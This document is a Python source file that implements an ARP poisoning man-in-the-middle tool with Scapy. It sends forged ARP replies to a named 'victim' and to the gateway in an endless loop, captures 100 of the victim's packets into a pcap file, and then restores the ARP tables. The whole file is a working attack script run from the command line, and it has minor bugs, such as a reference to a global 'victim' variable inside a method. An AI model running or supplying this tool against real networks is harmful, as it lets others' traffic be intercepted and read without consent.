from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time


def get_mac(targetip):
    """Helper function to get the MAC address of any given machine."""
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)  # Pass in target IP and make a packet
    # Send the packet on data link layer and store answer in resp variable:
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialised {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-' * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()  # Create poisoned ARP packet for the victim
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'IP src: {poison_victim.psrc}')
        print(f'IP dst: {poison_victim.pdst}')
        print(f'MAC dst: {poison_victim.hwdst}')
        print(f'MAC src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-' * 30)

        poison_gateway = ARP()  # Create a poisoned ARP packet for the gateway
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'IP src: {poison_gateway.psrc}')
        print(f'IP dst: {poison_gateway.pdst}')
        print(f'MAC dst: {poison_gateway.hwdst}')
        print(f'MAC src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)

        print('Beginning the ARP poison. Press Ctrl-C to stop.')
        while True:  # Infinite loop to maintain duration of poisoning
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:  # Break the poisoning loop
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f"ip host {victim}" # Filter packets for victim's IP
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)  # Sniff 100 packets with filter applied
        wrpcap('arper.pcap', packets)  # Write the packets to a file called arper.pcap
        print('Got the packets')
        self.restore()  # Restore ARP tables to their original values
        self.poison_thread.terminate()  # Terminate the poison thread
        print('Finished.')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff', count=5))
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff', count=5))


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
